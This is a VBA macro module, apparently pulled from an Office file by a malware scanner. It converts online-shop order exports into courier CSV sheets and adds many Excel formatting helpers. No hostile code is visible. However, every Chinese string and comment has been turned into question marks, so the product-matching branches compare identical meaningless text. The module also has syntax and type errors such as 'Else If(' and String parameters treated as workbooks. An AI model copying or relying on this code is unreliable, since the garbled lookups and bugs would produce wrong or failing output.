            j = j + 1
        End If
    Next
End Sub

Function yan(sourceWorkbook As String) As Integer
    Dim currentDate As Date         '????
    Dim currentMonth As String      '????
    Dim currentDay As String        '????
    Dim validRow As Integer
    Dim resFullWorkbook As String
    Dim j As Integer
    Dim title
    Dim count As Integer

    Dim name As String
    Dim address As String
    Dim tel As String
    Dim goodsName As String
    Dim leaveWord As String
    Dim longGoodsName As String
    Dim digit As String
    Dim province As String
    Dim city As String
    Dim district As String
    Dim state As String
    Dim goodsCode As String  ' ???
    Dim digitCount As Integer

    currentDate = Date                '??????,?????
    currentMonth = Month(currentDate) '??????
    currentDay = Day(currentDate)     '?????

    resFullWorkbook = ThisWorkbook.path + "\??" + currentMonth + "-" + currentDay + ".csv" '???xlsx????
    Workbooks.Add
    ActiveWorkbook.SaveAs resFullWorkbook, True
    Set resWorkbook = Application.Workbooks.Open(resFullWorkbook)       '??????
    
    digitCount = 1
    j = 2

    title = Array("* ??", "* ?????", "* ??????", "*??????", "* ?????/?", "* ??????", "* ??", "* ????", "* ????", "????", "*????", "?????")
    For count = 1 To 12
    resWorkbook.Sheets(1).Cells(1, count).Value = title(count - 1)
    Next

    validRow = sourceWorkbook.Sheets(1).Cells(65536, 1).End(xlUp).Row '????A??????
    For i = 2 To validRow '????????????????
        name = sourceWorkbook.Sheets(1).Range("U" & i)          '?????????
        address = sourceWorkbook.Sheets(1).Range("Z" & i)       '??????????
        tel = sourceWorkbook.Sheets(1).Range("V" & i)           '???????
        goodsName = sourceWorkbook.Sheets(1).Range("H" & i)     '??????
        leaveWord = sourceWorkbook.Sheets(1).Range("T" & i)     '????
        longGoodsName = sourceWorkbook.Sheets(1).Range("E" & i)
        digit = sourceWorkbook.Sheets(1).Range("O" & i)         '??????
        province = sourceWorkbook.Sheets(1).Range("W" & i)      '???????
        city = sourceWorkbook.Sheets(1).Range("X" & i)          '???????
        district = sourceWorkbook.Sheets(1).Range("Y" & i)      '???????
        state = sourceWorkbook.Sheets(1).Range("C" & i)
        goodsCode = ""
        If (state = "???") Then
            If (InStr(longGoodsName, "????")) Then
                If (goodsName = "????") Then
                    goodsCode = "Iroha??"
                ElseIf (goodsName = "????") Then
                    goodsCode = "Iroha??"
                ElseIf (goodsName = "?????") Then
                    goodsCode = "Iroha?????"
                End If
            End If

            If (InStr(longGoodsName, "kisstoy MISS")) Then
                If (goodsName = "??") Then
                    goodsCode = "kisstoy MISS CC?????"
                ElseIf (goodsName = "??") Then
                    goodsCode = "kisstoy MISS CC?????"
                End If
            End If

            If (InStr(longGoodsName, "??? ????")) Then
                If (goodsName = "??") Then
                    goodsCode = "???????????"
                End If
            End If

            If (InStr(longGoodsName, "kiss toy")) Then
                If (goodsName = "??+??(??)") Then
                    goodsCode = "kisstoy???????"
                End If
            End If

            If (InStr(longGoodsName, "iroha zen")) Then
                If (goodsName = "?? ???") Then
                    goodsCode = "?????????????"
                ElseIf (goodsName = "?? ???") Then
                    goodsCode = "??????????????"
                ElseIf (goodsName = "?? ??") Then
                    goodsCode = "?????????????"
                End If
            End If

            If (InStr(longGoodsName, "TENGA iroha rin")) Then
                If (goodsName = "???") Then
                    goodsCode = "TENGA irohaRIN?????(???)hmr-02"
                End If
            End If

            If (InStr(longGoodsName, "Satisfyer??")) Then
                If (goodsName = "??") Then
                    goodsCode = "Satisfyer ?????"
                End If
            End If
                
            If (InStr(longGoodsName, "???")) Then
                If (goodsName = "4?Plus???") Then
                    goodsCode = "?????PLUS?????"
                ElseIf (goodsName = "????") Then
                    goodsCode = "???????"
                ElseIf (goodsName = "????") Then
                    goodsCode = "???????"
                ElseIf (goodsName = "????") Then
                    goodsCode = "???????"
                End If
            End If

            If (InStr(longGoodsName, "Tenga iroha FIT")) Then
                If (goodsName = "???") Then
                    goodsCode = "??IirohaFIT??"
                ElseIf (goodsName = "???") Then
                    goodsCode = "??IrohaFIT??"
                End If
            End If

            ' todo
            ' If (InStr(longGoodsName, "????D-CUP")) Then
            '     If (goodsName = "D Cup (??)") Then
            '         goodsCode = "?????PLUS?????"
            '     End If
            ' End If
        
        
            If (goodsCode <> "") Then
                '???,??????????
                If (InStr(province, "?")) Then
                    province = Mid(province, 1, Len(province) - 1)
                End If

                If (InStr(province, "??") Or InStr(province, "??")) Then
                    resWorkbook.Sheets(1).Range("K" & j) = "??????"
                Else
                    resWorkbook.Sheets(1).Range("K" & j) = "????"
                End If

                resWorkbook.Sheets(1).Range("A" & j) = digitCount
                resWorkbook.Sheets(1).Range("A" & j + 1) = digitCount

                resWorkbook.Sheets(1).Range("B" & j) = name
                resWorkbook.Sheets(1).Range("B" & j + 1) = "*"

                resWorkbook.Sheets(1).Range("C" & j) = province
                resWorkbook.Sheets(1).Range("C" & j + 1).NumberFormat = "@"
                resWorkbook.Sheets(1).Range("C" & j + 1) = goodsCode

                resWorkbook.Sheets(1).Range("D" & j) = city
                resWorkbook.Sheets(1).Range("D" & j + 1) = digit ' ?????


                resWorkbook.Sheets(1).Range("E" & j) = district
                resWorkbook.Sheets(1).Range("F" & j) = address

                resWorkbook.Sheets(1).Range("G" & j).NumberFormat = "@"
                resWorkbook.Sheets(1).Range("G" & j) = "000000"

                resWorkbook.Sheets(1).Range("I" & j) = tel
                resWorkbook.Sheets(1).Range("J" & j) = leaveWord

                digitCount = digitCount + 1
                j = j + 2
            End If
        End If
    Next
End Function


Function yi(sourceWorkbook As String) As Integer
    Dim currentDate As Date         '????
    Dim currentMonth As String      '????
    Dim currentDay As String        '????
    Dim validRow As Integer
    Dim resFullWorkbook As String
    Dim j As Integer
    Dim title
    Dim count As Integer

    Dim name As String
    Dim address As String
    Dim tel As String
    Dim goodsName As String
    Dim leaveWord As String
    Dim longGoodsName As String
    Dim digit As String
    Dim province As String
    Dim city As String
    Dim district As String
    Dim state As String
    Dim goodsCode As String  ' ???
    Dim digitCount As Integer
    Dim extraFlag As Boolean ' ??????

    currentDate = Date                '??????,?????
    currentMonth = Month(currentDate) '??????
    currentDay = Day(currentDate)     '?????

    resFullWorkbook = ThisWorkbook.path + "\???" + currentMonth + "-" + currentDay + ".csv" '???xlsx????
    Workbooks.Add
    ActiveWorkbook.SaveAs resFullWorkbook, True
    Set resWorkbook = Application.Workbooks.Open(resFullWorkbook)       '??????
    
    digitCount = 1
    j = 2

    title = Array("* ??", "* ?????", "* ??????", "*??????", "* ?????/?", "* ??????", "* ??", "* ????", "* ????", "????", "*????", "?????")
    For count = 1 To 12
    resWorkbook.Sheets(1).Cells(1, count).Value = title(count - 1)
    Next

    validRow = sourceWorkbook.Sheets(1).Cells(65536, 1).End(xlUp).Row '????A??????
    For i = 2 To validRow '????????????????
        name = sourceWorkbook.Sheets(1).Range("U" & i)          '?????????
        address = sourceWorkbook.Sheets(1).Range("Z" & i)       '??????????
        tel = sourceWorkbook.Sheets(1).Range("V" & i)           '???????
        goodsName = sourceWorkbook.Sheets(1).Range("H" & i)     '??????
        leaveWord = sourceWorkbook.Sheets(1).Range("T" & i)     '????
        longGoodsName = sourceWorkbook.Sheets(1).Range("E" & i)
        digit = sourceWorkbook.Sheets(1).Range("O" & i)         '??????
        province = sourceWorkbook.Sheets(1).Range("W" & i)      '???????
        city = sourceWorkbook.Sheets(1).Range("X" & i)          '???????
        district = sourceWorkbook.Sheets(1).Range("Y" & i)      '???????
        state = sourceWorkbook.Sheets(1).Range("C" & i)
        goodsCode = ""
        extraFlag = False
        If (state = "???") Then
            If (InStr(longGoodsName, "????????")) Then
                If (goodsName = "??") Then
                    goodsCode = "6970808281120"
                End If
            End If

            If (InStr(longGoodsName, "KY???")) Then
                If (goodsName = "100ml?") Then
                    goodsCode = "5052197037678"
                ElseIf (goodsName = "50ml?") Then
                    goodsCode = "5052197037654"
                End If
            End If

            If (InStr(longGoodsName, "????")) Then
                If (goodsName = "???") Then
                    goodsCode = "600231886925"
                End If
            End If

            If (InStr(longGoodsName, "EasyLive??????")) Then
                If (goodsName = "e-Touch??") Then
                    goodsCode = "6970736078830"
                End If
            End If

            If (InStr(longGoodsName, "?????")) Then
                If (goodsName = "??????(??80-130?)") Then
                    goodsCode = "TNY7836002"
                ElseIf (goodsName = "??????(??80-120?)") Then
                    goodsCode = "TNY7790M02"
                ElseIf (goodsName = "??????(??80-130?)") Then
                    goodsCode = "TNY7023002"
                ElseIf (goodsName = "?????(??80-115?)") Then
                    goodsCode = "TNY7038008"
                ElseIf (goodsName = "????????(??80-120?)") Then
                    goodsCode = "TNY7775002"
                ElseIf (goodsName = "??????(??80-130?)") Then
                    goodsCode = "TNY7758002"
                End If
            End If

            If (InStr(longGoodsName, "???????")) Then
                If (goodsName = "??????(??80-120?)") Then
                    goodsCode = "TNY7790M01"
                ElseIf (goodsName = "??????(??80-130?)") Then
                    goodsCode = "TNY7836001"
                ElseIf (goodsName = "??????(??80-120?)") Then
                    goodsCode = "TNY7085001"
                ElseIf (goodsName = "???????(??80-120?)") Then
                    goodsCode = "TNY7958001"
                ElseIf (goodsName = "??????(??80-130?)") Then
                    goodsCode = "6937486675733"
                ElseIf (goodsName = "??????(??80-120?)") Then
                    goodsCode = "TNY7079001"
                ElseIf (goodsName = "???????(??80-120?)") Then
                    goodsCode = "TNY7022001"
                ElseIf (goodsName = "?????(??80-120?)") Then
                    goodsCode = "TNY7072001"
                ElseIf (goodsName = "??????(??80-130?)") Then
                    goodsCode = "TNY7058001"
                End If
            End If

            If (InStr(longGoodsName, "????")) Then
                If (goodsName = "???????(??80-120?)") Then
                    goodsCode = "NY1WZT000180"
                 ElseIf (goodsName = "??????(??80-120?)") Then
                    goodsCode = "TNY7730002"
                ElseIf (goodsName = "????????(??80-120?)") Then
                    goodsCode = "TNY7823001"
                ElseIf (goodsName = "???????(??80-120?)") Then
                    goodsCode = "TNY7936007"
                ElseIf (goodsName = "?????????(??80-120?)") Then
                    goodsCode = "TNY7765002"
                ElseIf (goodsName = "???????(??80-120?)") Then
                    goodsCode = "NY1WZT000179"
                ElseIf (goodsName = "???????(??80-120?)") Then
                    goodsCode = "NY1JCT000020"
                ElseIf (goodsName = "?V??(??80-120?)") Then
                    goodsCode = "TNY7832001"
                ElseIf (goodsName = "?????(??80-120?)") Then
                    goodsCode = "TNY777702"
                ElseIf (goodsName = "?????(??80-120?)") Then
                    goodsCode = "TNY7071003"
                ElseIf (goodsName = "???????(??80-120?)") Then
                    goodsCode = "TNY7065001"
                ElseIf (goodsName = "???????(??80-120?)") Then
                    goodsCode = "TNY7027003"
                ElseIf (goodsName = "???????(??80-120?)") Then
                    goodsCode = "TNY7027002"
                ElseIf (goodsName = "?????(??80-120?)") Then
                    goodsCode = "6937486675115"
                End If
            End If

            If (InStr(longGoodsName, "????????")) Then
                If (goodsName = "?????????(??80-120)") Then
                    goodsCode = "TNY7084001"
                Else If(goodsName = "?????????(??80-120)") Then
                    goodsCode = "TNY7989003"
                Else If(goodsName = "??????????(??80-115)") Then
                    goodsCode = "TNY7980008"
                Else If(goodsName = "??????????(??80-115)") Then
                    goodsCode = "TNY7980003"
                Else If(goodsName = "???????(??80-125)") Then
                    goodsCode = "TNY7060001"
                Else If(goodsName = "???????(??80-125)") Then
                    goodsCode = "TNY7060007"
                Else If(goodsName = "??????????(??80-125)") Then
                    goodsCode = "TNY7939011"
                ElseIf (goodsName = "???????(??80-120?)") Then
                    goodsCode = "TNY7027003"
                ElseIf (goodsName = "???????(??80-120?)") Then
                    goodsCode = "TNY7027002"
                ElseIf (goodsName = "???????(??80-120?)") Then
                    goodsCode = "TNY7065001"
                ElseIf (goodsName = "??????(??80-120?)") Then
                    goodsCode = "TNY7790M01"
                End If
            End If
             

            If (InStr(longGoodsName, "Zalo Desire?????")) Then
                If (goodsName = "???(???)") Then
                    goodsCode = "600231886987"
                    extraFlag = True
                 ElseIf (goodsName = "???(???)") Then
                    goodsCode = "600231886994"
                    extraFlag = True
                ElseIf (goodsName = "???(???)") Then
                    goodsCode = "600231886949"
                    extraFlag = True
                ElseIf (goodsName = "???(???)") Then
                    goodsCode = "600231886956"
                    extraFlag = True
                End If
            End If

            If (InStr(longGoodsName, "ZALO QUEEN????")) Then
                If (goodsName = "???????") Then
                    goodsCode = "0600231887083"
                    extraFlag = True
                 ElseIf (goodsName = "???????") Then
                    goodsCode = "0600231887076"
                    extraFlag = True
                ElseIf (goodsName = "???????") Then
                    goodsCode = "0600231887069"
                    extraFlag = True
                End If
            End If

            If (InStr(longGoodsName, "????????")) Then
                If (goodsName = "?????32??") Then
                    goodsCode = "6923146115183"
                End If
            End If

            If (InStr(longGoodsName, "kiss toy????")) Then
                If (goodsName = "??") Then
                    goodsCode = "6928202957738"
                ElseIf (goodsName = "??") Then
                    goodsCode = "6928202967737"
                End If
            End If
        
            If (goodsCode <> "") Then
                '???,??????????
                If (InStr(province, "?")) Then
                    province = Mid(province, 1, Len(province) - 1)
                End If

                If (InStr(province, "??") Or InStr(province, "??")) Then
                    resWorkbook.Sheets(1).Range("K" & j) = "??????"
                Else
                    resWorkbook.Sheets(1).Range("K" & j) = "????"
                End If

                resWorkbook.Sheets(1).Range("A" & j) = digitCount
                resWorkbook.Sheets(1).Range("A" & j + 1) = digitCount

                resWorkbook.Sheets(1).Range("B" & j) = name
                resWorkbook.Sheets(1).Range("B" & j + 1) = "*"

                resWorkbook.Sheets(1).Range("C" & j) = province
                resWorkbook.Sheets(1).Range("C" & j + 1).NumberFormat = "@"
                resWorkbook.Sheets(1).Range("C" & j + 1) = goodsCode

                resWorkbook.Sheets(1).Range("D" & j) = city
                resWorkbook.Sheets(1).Range("D" & j + 1) = digit ' ?????

                resWorkbook.Sheets(1).Range("E" & j) = district
                resWorkbook.Sheets(1).Range("F" & j) = address

                resWorkbook.Sheets(1).Range("G" & j).NumberFormat = "@"
                resWorkbook.Sheets(1).Range("G" & j) = "000000"

                resWorkbook.Sheets(1).Range("I" & j) = tel
                resWorkbook.Sheets(1).Range("J" & j) = leaveWord
                If (extraFlag) Then
                    j = j + 1
                    resWorkbook.Sheets(1).Range("A" & j + 1) = digitCount
                    resWorkbook.Sheets(1).Range("B" & j + 1) = "*"
                    resWorkbook.Sheets(1).Range("C" & j + 1).NumberFormat = "@"
                    resWorkbook.Sheets(1).Range("C" & j + 1) = "JS2ZPT000002"
                    resWorkbook.Sheets(1).Range("D" & j + 1) = "1"
                End If
                digitCount = digitCount + 1
                j = j + 2
            End If
        End If
    Next
End Function


Sub ??????()
Attribute ??????.VB_ProcData.VB_Invoke_Func = " \n14"

    Selection.ClearFormats
    
End Sub

Sub ?????()
Attribute ?????.VB_ProcData.VB_Invoke_Func = "S\n14"

    Selection.SpecialCells(xlCellTypeVisible).Select
    
End Sub

Sub ??()
Attribute ??.VB_ProcData.VB_Invoke_Func = "K\n14"

    Application.ScreenUpdating = False
    
    On Error GoTo Error1
    
    Selection.SpecialCells(xlCellTypeBlanks).Select
    
    Application.ScreenUpdating = True
    
    Exit Sub
    
Error1:
    MsgBox "??:????????????!", 48
    Resume Next
    
End Sub

Sub ???????()
Attribute ???????.VB_ProcData.VB_Invoke_Func = "N\n14"

    Application.ScreenUpdating = False
    
    Set M_cells = Intersect(Selection.SpecialCells(xlCellTypeVisible), Selection)    '??:???Selection.SpecialCells()???,?Selection???????????,??Selection????????!
    
    For Each rng In M_cells
    
        If IsNumeric(rng) Then
        
            If Len(rng) > 15 Then
                rng.NumberFormatLocal = "@"
            End If
            
        End If
        
        rng.Value = rng.Value
     
    Next
     
    Application.ScreenUpdating = True
     
End Sub

Sub ????()
Attribute ????.VB_ProcData.VB_Invoke_Func = "Y\n14"

    Application.ScreenUpdating = False

    With Selection
    
        .Font.Bold = False
        .Font.Italic = False
        .Font.Underline = xlUnderlineStyleNone
        .Font.Size = 9
        
        .Borders.LineStyle = xlContinuous
        
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlCenter
        .WrapText = True
         
        .RowHeight = 21
        .ColumnWidth = 9
        
    End With
    
    Application.ScreenUpdating = True
    
End Sub


Sub ??????????()
Attribute ??????????.VB_ProcData.VB_Invoke_Func = "V\n14"

Dim MyData As New DataObject

Application.ScreenUpdating = False


If Not Application.CutCopyMode = False Then

   MyData.GetFromClipboard
   
   Data1 = MyData.GetText(1)
   
   Data2 = Replace(Data1, Chr(9), "_")
   Data3 = Replace(Data2, Chr(13) + Chr(10), "_")

   arr = Split(Data3, "_")
   

   If Selection.Rows.count = 1 Or Selection.Columns.count = 1 Then
   
   Else
   
      MsgBox "????????????!??????", 48, "??!"
      Exit Sub
      
   End If
   
   
   n = 0
   j = UBound(arr)
   
      
   If arr(j) = Chr(32) Then
      j = j - 1
   End If

   
   For Each rng In Selection.SpecialCells(xlCellTypeVisible)
   
       i = n Mod j
       rng.Value = arr(i)
       n = n + 1
       
   Next
   
      
   Set MyData = Nothing
   
Else

   MsgBox "?????!", 48, "??!"
   
End If

  
Application.ScreenUpdating = True

End Sub

Sub ???????()

Application.ScreenUpdating = False

MyPath = ActiveWorkbook.path
MyName = Dir(MyPath & "\" & "*.xls")

s = Application.InputBox("????????????:" & Chr(13), Type:=1 + 2)

Do While MyName <> ""

    Workbooks.Open(MyPath & "\" & MyName).Activate
    
    If Sheets.count <> 1 Then
        ActiveWorkbook.Worksheets(s).Delete
        Application.DisplayAlerts = False
        ActiveWorkbook.Close True
    End If

    MyName = Dir

Loop

Application.Quit

Application.ScreenUpdating = True

End Sub

Sub ??????????()
Attribute ??????????.VB_ProcData.VB_Invoke_Func = "X\n14"

    Dim area As Range
    
    Set area = ActiveCell

    Application.ScreenUpdating = False
    
    For Each rng In Selection
    
        r = rng.SpecialCells(xlLastCell).Row
        c = rng.Column

        Set area = Union(area, Union(rng, Range(rng, Cells(r, c))))
        
    Next
    
    Application.ScreenUpdating = True
    
    Cells(r, c).Activate
    
    Application.ScreenUpdating = False
    
    area.Select
    
    Application.ScreenUpdating = True
        
End Sub

Sub ?????()

Application.ScreenUpdating = False
Application.DisplayAlerts = False

Dim rng As Range

    a = Selection.Row
    b = Selection.Column
    n = Selection.Rows.count
    
    Add = Application.InputBox(prompt:="????????????:" & Chr(13), Type:=0 + 1)
    
    If Add = 0 Then
        Exit Sub
    End If
    
    Selection.MergeCells = False
    
    For i = a To a + n - 1
    
        If m = 0 Then
            Cells(i, b).Select
        End If
        
        m = m + 1
        
        Union(Selection, Cells(i, b)).Select
        
        If (i - a + 1) Mod Add = 0 Then
            Selection.Merge
            m = 0
        End If
        
    Next
    
Application.DisplayAlerts = True
Application.ScreenUpdating = True
    
End Sub

Sub ????????()
Attribute ????????.VB_ProcData.VB_Invoke_Func = " \n14"

    Application.ScreenUpdating = False

    Selection.PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks:=True, Transpose:=False
    
    Application.ScreenUpdating = True
    
End Sub
        
Sub ????()
Attribute ????.VB_ProcData.VB_Invoke_Func = "F\n14"

    Application.ScreenUpdating = False
    
    Dim crr()

    t = Timer

    arr = Array(11, 16, 82, 94, 108)
    brr = Array(23, 27, 63, 64, 76, 77, 91, 92, 98, 105, 106, 115, 119, 137)
    
    x = False
    y = False
    
    a = Selection(1).Row
    b = Selection(1).Column
    
    n = Selection.Rows.count
    m = Selection.Columns.count
    
    ReDim crr(1 To m)
    
    For l = 1 To m
        crr(l) = Cells(1, b + l - 1).Interior.ColorIndex
    Next
    
    Selection.ClearFormats
    
    For l = 1 To m
        Cells(1, b + l - 1).Interior.ColorIndex = crr(l)
    Next
    
    t1 = Timer
    
    For i = b To b + m - 1
    
        For Each a In arr
            If a = i Then
                x = True
                Exit For
            Else
                For Each b In brr
                    If b = i Then
                        y = True
                        Exit For
                    End If
                Next
            End If
        Next
        
        
        If x Then
            
            Columns(i).NumberFormatLocal = "@"
            
        Else
            If y Then
                Columns(i).NumberFormatLocal = "yyyy/m/d"
            Else
                If i = 28 Then
                    Columns(i).NumberFormatLocal = "[$-F400]h:mm:ss AM/PM"
                Else
                    Columns(i).NumberFormatLocal = "G/????"
                End If
            End If
        End If
        
        x = False
        y = False
    
    Next
    
    t2 = Timer
    
    For Each Cell In Selection
    
        If Cell.Value = "" Then
            Cell.ClearContents
        Else
            Cell.Value = Cell.Value
        End If

    Next
    
    t3 = Timer
    
    With Selection
    
        .Font.Bold = False
        .Font.Italic = False
        .Font.Underline = xlUnderlineStyleNone
        .Font.Size = 9
        
        .Borders.LineStyle = xlContinuous
        
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlCenter
        .WrapText = True
         
        .RowHeight = 21
        .ColumnWidth = 9
        
    End With
    
    t4 = Timer
    
    If b <= 23 And b + m - 1 >= 23 Then
    
        For Each Cell In Range(Cells(1, 23), Cells(n, 23))
            If Cell Like "1905/" & "*" Then
                Cell.NumberFormatLocal = "G/????"
            End If
        Next
        
    End If
    
    t5 = Timer
    
    MsgBox "??????:" & Timer - t & "s" '& Chr(10) & "??:" & Chr(10) & "???:" & t1 - t & "s" & Chr(10) & "??????:" & t2 - t1 & "s" & Chr(10) _
            & "?????:" & t3 - t2 & "s" & Chr(10) & "??????:" & t4 - t3 & "s" & Chr(10) & "??????:" & t5 - t4 & "s"
    
    Application.ScreenUpdating = True

End Sub

Sub ???()
Attribute ???.VB_ProcData.VB_Invoke_Func = "C\n14"

Application.ScreenUpdating = False

Set area = ActiveCell

    For Each Cell In Selection
        Set area = Union(area, Columns(Cell.Column))
    Next
    
    area.Select
Application.ScreenUpdating = True

End Sub

Sub ???()
Attribute ???.VB_ProcData.VB_Invoke_Func = "r\n14"

Application.ScreenUpdating = False

Set area = ActiveCell

    For Each Cell In Selection
        Set area = Union(area, Rows(Cell.Row))
    Next
    
    area.Select
    
Application.ScreenUpdating = True
    
End Sub

Sub ???????()
Attribute ???????.VB_ProcData.VB_Invoke_Func = "m\n14"

Application.ScreenUpdating = False

    Do Until u = "+" Or u = "-"
        u = InputBox("???????:" & Chr(10) & Chr(10) & "     " & "+:????" & "         " & "-:????", "??")
        If u = "" Then
            Exit Sub
        Else
            If u <> "+" And u <> "-" Then
                MsgBox " ??,???????? + ? - !", vbInformation, "??"
            End If
        End If
    Loop
        
    Do Until v = 1 Or v = 2
        v = InputBox("?????:" & Chr(10) & Chr(10) & "     " & "1:??" & "   " & "2:??", "??")
        If v = "" Then
            Exit Sub
        Else
            If v <> 1 And v <> 2 Then
                MsgBox " ??,???????? 1 ? 2 !", vbInformation, "??"
            End If
        End If
    Loop
        
    w = InputBox("?????:", "??")
        
    For Each rng In Selection.SpecialCells(xlCellTypeVisible)
    
        If u = "+" Then
            If v = 1 Then
                rng.Value = w & rng
            Else
                rng.Value = rng & w
            End If
        Else
            If v = 1 Then
                If Left(rng, Len(w)) = w Then
                    rng.Value = Right(rng, Len(rng) - Len(w))
                End If
            Else
                If Right(rng, Len(w)) = w Then
                    rng.Value = Left(rng, Len(rng) - Len(w))
                End If
            End If
        End If
    
    Next

Application.ScreenUpdating = True

End Sub

Sub ???????????()
Attribute ???????????.VB_ProcData.VB_Invoke_Func = "P\n14"

Dim c, r, Add, Num As Integer

c = ActiveCell.Column
r = ActiveCell.Row
Num = 0

Add = Application.InputBox(prompt:="???????????" & Chr(13), Type:=0 + 1)

If Add = False Then
    Exit Sub
End If


Do Until Num = Add - 1

   r = r + 1

   If Cells(r, c).EntireRow.Hidden Then
   
   Else
        Num = Num + 1
        
   End If

Loop


Range(ActiveCell, Cells(r, c)).SpecialCells(xlCellTypeVisible).Select

End Sub

Sub ?????()
Attribute ?????.VB_ProcData.VB_Invoke_Func = "H\n14"

    Application.ScreenUpdating = False

    k = Cells(1, 1).End(xlToRight).Column
    
    For j = 1 To k
    
        If Cells(1, j).Interior.ColorIndex = 15 Then
            Columns(j).Hidden = 1
        End If
               
    Next
    
    'Columns("CP").Hidden = 0
    'Columns("BR").Hidden = 0
    
    Application.ScreenUpdating = True

End Sub

Sub ?????????()

For Each Sheet In Worksheets

    'If Sheet.Name <> "????" Then
        
        For Each Cell In Sheet.UsedRange
        
            If Cell.Value = "" Then
                Cell.ClearContents
            Else
                Cell.Value = Cell.Value
            End If
    
        Next
        
    'End If
    
Next

End Sub

Sub ?????????0?()

    Application.ScreenUpdating = False
    
    Selection.FormatConditions.Add Type:=xlCellValue, Operator:=xlEqual, _
        Formula1:="=0"
    Selection.FormatConditions(Selection.FormatConditions.count).SetFirstPriority
    
    With Selection.FormatConditions(1).Font
        .color = ActiveCell.Interior.color
    End With
    
    Selection.FormatConditions(1).StopIfTrue = False
    
    Application.ScreenUpdating = True

End Sub

Sub ????????????()
Attribute ????????????.VB_ProcData.VB_Invoke_Func = "Q\n14"

'????????????????????

    Dim pvt As PivotTable, pvtcache As PivotCache
    Dim sht As Worksheet
    For Each sht In ActiveWorkbook.Worksheets
        For Each pvt In sht.PivotTables
            pvt.PivotCache.MissingItemsLimit = xlMissingItemsNone
        Next pvt
    Next sht
    On Error Resume Next
    For Each pvtcache In ActiveWorkbook.PivotCaches
        pvtcache.Refresh
    Next pvtcache
   On Error GoTo 0
End Sub

Sub ??????()
Attribute ??????.VB_ProcData.VB_Invoke_Func = "q\n14"

    If ActiveWorkbook.ShowPivotTableFieldList Then
        ActiveWorkbook.ShowPivotTableFieldList = False
    Else
        ActiveWorkbook.ShowPivotTableFieldList = True
    End If

End Sub

Sub ???????()

    c = ActiveCell.Interior.color
    
    H = Hex(c)
    
    s = 6 - Len(H)
    
    If s <> 0 Then
    
        For i = 1 To s
            H = "0" & H
        Next
        
    End If
    
    b1 = Left(H, 2)
    g1 = Mid(H, 3, 2)
    r1 = Right(H, 2)
    
    r2 = CLng("&h" & r1)
    g2 = CLng("&h" & g1)
    b2 = CLng("&h" & b1)
    
    MsgBox "?????" & Chr(13) & Chr(13) & _
        "ColorIndex : " & ActiveCell.Interior.ColorIndex & Chr(13) & _
        "Color : " & ActiveCell.Interior.color & Chr(13) & _
        "RGB(" & r2 & " , " & g2 & " , " & b2 & ")", vbInformation, "???????"
    
End Sub

Sub ????()
Attribute ????.VB_ProcData.VB_Invoke_Func = "B\n14"

    n = Selection.Cells.count

    color1 = color_rgb(Selection(1))
    color2 = color_rgb(Selection(n))
    
    i = 0
    
    For Each rng In Selection
        k = i / n
        r = k * color1(0) + color2(0) * (1 - k)
        g = k * color1(1) + color2(1) * (1 - k)
        b = k * color1(2) + color2(2) * (1 - k)
        rng.Interior.color = RGB(r, g, b)
        i = i + 1
    Next

End Sub

Function color_rgb(rng As Range) As Integer()

Dim color(0 To 2) As Integer
    
    c = rng.Interior.color
    
    H = Hex(c)
    s = 6 - Len(H)
    
    If s <> 0 Then
        For i = 1 To s
            H = "0" & H
        Next
    End If
    
    b1 = Left(H, 2)
    g1 = Mid(H, 3, 2)
    r1 = Right(H, 2)
    
    color(0) = CLng("&h" & r1)
    color(1) = CLng("&h" & g1)
    color(2) = CLng("&h" & b1)
    
    color_rgb = color()

End Function

Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True

' InQuest injected base64 decoded content
' kz+,
' @S<8
' H9TA
' Y< ;5.
' /CXH6
' H9TA
' Y< ;5.
' /CXH,
' VH'!(C
' bzWK

INQUEST-PP=macro
